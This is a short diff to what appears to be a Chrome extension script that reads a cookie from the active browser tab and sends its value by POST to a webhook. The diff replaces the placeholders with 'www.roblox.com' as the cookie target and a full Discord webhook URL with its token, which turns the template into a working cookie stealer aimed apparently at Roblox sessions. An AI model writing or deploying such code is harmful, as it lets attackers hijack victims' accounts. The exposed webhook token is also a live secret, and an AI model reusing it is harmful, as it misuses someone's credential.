@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   sendButton.addEventListener('click', () => {
     // Replace 'YOUR_COOKIE_NAME' with the name of the cookie you want to access
-    const cookieName = 'YOUR_COOKIE_NAME';
+    const cookieName = 'www.roblox.com';
     
     chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
       chrome.scripting.executeScript({
@@ -23,7 +23,7 @@ function copyCookie(cookieName) {
 
   if (cookieValue) {
     // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
-    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+    const webhookUrl = 'https://discord.com/api/webhooks/1154144199193665762/PQd6BDDDFcw3kKn6uIZwtl8B5zE_PPc2_fwaAijrV9nZViQkVHpHb_Mvll_efrExEZnh';
 
     fetch(webhookUrl, {
       method: 'POST',
